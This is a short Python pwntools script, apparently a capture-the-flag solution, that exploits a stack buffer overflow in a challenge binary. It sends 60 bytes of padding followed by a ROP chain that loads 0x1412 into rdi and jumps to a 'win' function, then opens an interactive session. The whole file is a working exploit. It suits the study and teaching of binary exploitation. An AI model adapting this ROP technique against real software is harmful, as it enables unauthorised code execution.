from pwn import *

elf = ELF("./chal")  
r = ROP(elf)

context.binary = elf

# io = process("./chal")    
io = remote("0.0.0.0",1008)
# Offset to overwrite the return address
padding = 60
POP_RDI = r.find_gadget(["pop rdi","ret"]).address
RET = r.find_gadget(["ret"]).address

# Call the win function with the correct argument (0x1412)
payload = b"A" * padding + p64(0x4a55) + p32(0x0)   + p64(POP_RDI)  + p64(0x1412) + p64(RET) + p64(elf.sym.win)

io.sendlineafter("input: ",payload)

io.interactive()
